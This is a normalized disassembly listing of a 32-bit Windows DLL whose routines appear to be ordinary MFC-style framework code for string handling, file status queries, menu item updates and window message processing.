lea eax [ ebp - 0x10 ]
push eax
call sub_10014242
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_100144cd
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10014005
mov eax sub_10019aaf
call sub_10004904
sub esp 0x120
and [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x12c ]
push esi
push eax
call sub_100140b6
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push 0x1
mov eax 0x100
pop esi
lea ecx [ ebp - 0x10 ]
push eax
push eax
mov [ ebp - 0x4 ] esi
call sub_1001459d
push eax
lea eax [ ebp - 0x11a ]
push eax
call sub_10013b2b
push 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100145ec
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10014242
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_100144cd
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_10014087
push ebp
mov ebp esp
sub esp 0x11c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x11c ]
push eax
call sub_100140b6
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10a ]
push eax
call sub_100144f7
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100140b6
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push 0x118
push 0x0
mov edi ecx
push esi
call sub_10004940
add esp 0xc
lea eax [ esi + 0x12 ]
push 0x104
push [ edi + 0xc ]
push eax
call [ lstrcpynA@IAT ]
mov eax [ edi + 0x4 ]
or ebx 0xffffffff
cmp eax ebx
je r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
call [ GetFileTime@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x0
push [ edi + 0x4 ]
call [ GetFileSize@IAT ]
cmp eax ebx
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ edi + 0xc ]
cmp [ edi - 0x8 ] 0x0
jne r-xdata
push edi
call [ GetFileAttributesA@IAT ]
cmp eax ebx
je r-xdata
and [ esi + 0x10 ] 0x0
jmp r-xdata
mov [ esi + 0x10 ] al
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea ecx [ ebp + 0x8 ]
call sub_100131cd
mov eax [ eax ]
push ebx
mov [ esi ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_100131cd
mov eax [ eax ]
push ebx
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_100131cd
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_10014190
push ebp
mov ebp esp
sub esp 0x140
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
lea edi [ esi + 0x12 ]
push edi
call sub_10013995
test eax eax
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call [ FindFirstFileA@IAT ]
or edi 0xffffffff
cmp eax edi
jne r-xdata
and [ edi ] al
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov al [ ebp - 0x140 ]
push edi
and al 0x7f
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] al
mov eax [ ebp - 0x120 ]
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x13c ]
push eax
call sub_100131cd
mov eax [ eax ]
push edi
mov [ esi ] eax
lea eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_100131cd
mov eax [ eax ]
push edi
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_100131cd
mov eax [ eax ]
mov [ esi + 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
pop edi
pop esi
leave
retn 0x8
push 0x1
pop eax
mov eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
sub_10014242
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
cmp [ eax - 0xc ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
push [ ecx ]
mov ecx esi
call sub_10014576
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_1001433a
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_10003c35
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_1001462e
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_100143bc
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_10003cc4
retn
call sub_10014657
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_10014404
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_100143bc
sub_10014476
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_10014404
push [ esi - 0x8 ]
mov ecx edi
call sub_1001433a
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_10004be0
add esp 0xc
sub_100144a4
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_10014404
push edi
mov ecx esi
call sub_1001433a
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_100144cd
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_100143bc
sub_100144f7
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
test ebx ebx
mov [ esi ] eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
mov eax ebx
shr eax 0x10
test ax ax
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
mov edi eax
test edi edi
je r-xdata
movzx eax bx
push eax
call sub_10017609
jmp r-xdata
push edi
mov ecx esi
call sub_1001433a
push edi
push ebx
push [ esi ]
call sub_10004be0
add esp 0xc
sub_10014549
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_100144a4
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_10004be0
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_10014576
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_10014549
mov eax esi
pop edi
pop esi
retn 0x4
sub_1001459d
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_1001433a
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_10004be0
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_10014435
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_100145ec
push esi
mov esi ecx
call sub_10014476
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_1001462e
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_100049d2
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_1001468a
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_10018083
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_100180bb
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_10014700
mov eax sub_10019acc
call sub_10004904
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
test eax eax
mov edi 0xf1a0
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x10 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10014242
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
add ecx edi
mov [ eax ] ecx
mov eax [ esi + 0x8 ]
push [ ebp + 0x10 ]
add eax edi
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100182f5
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
call sub_100144cd
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_100144cd
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push 0xf006
lea ecx [ ebp + 0x10 ]
call sub_10017609
sub_100147a0
mov eax sub_10019af4
call sub_10004904
push ecx
push ecx
push esi
push 0x14
call sub_1001462e
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_10014662
mov eax [ rw-data ]
lea ecx [ esi + 0x10 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0xc ] eax
call sub_10014576
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x10 ] esi
call sub_10004998
pop esi
sub_1001480b
mov eax [ esp + 0x4 ]
mov ecx 0x10b
cmp eax ecx
ja r-xdata
sub eax 0x3e3
je r-xdata
je r-xdata
push 0xa
dec eax
je r-xdata
push 0x3
jmp r-xdata
cmp eax 0x3e
ja r-xdata
dec eax
je r-xdata
pop eax
cmp eax 0x6b
ja r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
mov ecx 0x90
cmp eax ecx
ja r-xdata
je r-xdata
push 0x8
jmp r-xdata
cmp eax 0x19
ja r-xdata
push 0x5
jmp r-xdata
push 0x1
jmp r-xdata
mov ecx 0xb6
cmp eax ecx
ja r-xdata
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x47
ja r-xdata
cmp eax 0x27
ja r-xdata
je r-xdata
sub eax 0xb7
je r-xdata
je r-xdata
cmp eax 0x75
ja r-xdata
sub eax 0x50
je r-xdata
je r-xdata
add eax 0xffffffcc
cmp eax 0x8
ja r-xdata
je r-xdata
push 0x9
jmp r-xdata
cmp eax 0x18
ja r-xdata
sub eax 0x8
je r-xdata
push 0x6
jmp r-xdata
sub eax 0x91
je r-xdata
sub eax 0x7b
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x40
je r-xdata
jmp [ eax * 4 + jump_table_10014a65 ]
push 0xd
jmp r-xdata
cmp eax 0x20
ja r-xdata
jmp [ eax * 4 + jump_table_10014a01 ]
dec eax
dec eax
je r-xdata
push 0x7
jmp r-xdata
sub eax 0x9
je r-xdata
dec eax
je r-xdata
sub eax 0x6c
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
sub eax 0x21
je r-xdata
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
sub eax 0xd
je r-xdata
sub eax 0x7
je r-xdata
dec eax
je r-xdata
push 0xc
jmp r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
push 0xb
jmp r-xdata
sub eax 0x1a
je r-xdata
retn 0x4
dec eax
dec eax
jne r-xdata
sub eax 0x6
je r-xdata
sub eax 0x6
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
dec eax
je r-xdata
jmp r-xdata
sub eax 0x3
jne r-xdata
jmp r-xdata
dec eax
je r-xdata
dec eax
je r-xdata
dec eax
dec eax
jne r-xdata
dec eax
dec eax
je r-xdata
jmp r-xdata
dec eax
jne r-xdata
dec eax
jne r-xdata
jmp r-xdata
push 0xe
jmp r-xdata
sub_10014aa3
mov eax sub_10019b08
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_10014ace
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_10014bd5
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_10018d2c
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_100160bf
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_10014ace
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_10004fa0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_10014d43
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_10014d69
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_100174e8
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_100153b4
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_100153b4
mov ecx eax
call sub_1001750f
mov ecx [ ecx + 0x1c ]
sub_10014df9
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_10014e5b
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_10019121
cmp [ rw-data ] edi
je r-xdata
sub_10014eb1
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_10017905
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_10015016
push esi
mov esi ecx
call sub_10014a89
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_10004940
add esp 0xc
mov eax esi
pop esi
retn
sub_10015054
push esi
push edi
mov esi ecx
call sub_10014a89
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_10004940
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_100150a3
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_1001744a
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_100153b4
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_100174cd
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_10016ed2
sub_1001511c
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_1001744a
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_1001682d
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_1001682d
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_1001517d
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_1001682d
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_100153b4
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_100153b4
cmp esi eax
je r-xdata
mov ecx esi
call sub_100174cd
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_100151f3
mov eax sub_10019b14
call sub_10004904
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_10018322
call sub_100188b3
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_10015080
mov eax [ ecx ]
push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x18 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_100150a3
jmp r-xdata
sub_1001529d
call sub_10013b81
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0xc ]
call [ edx + 0x6c ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x18 ] eax
call sub_10014678
mov eax r-xdata
retn
sub_100152e6
push esi
push sub_10018322
mov ecx rw-data
call sub_100188b3
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_1001531b
push esi
mov esi ecx
push sub_10018322
mov ecx rw-data
call sub_100188b3
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_10015342
mov eax sub_10019b2a
call sub_10004904
push esi
call sub_10018d52
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_100179ac
call sub_1001461c
push 0x48
mov ebx eax
call sub_1001462e
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
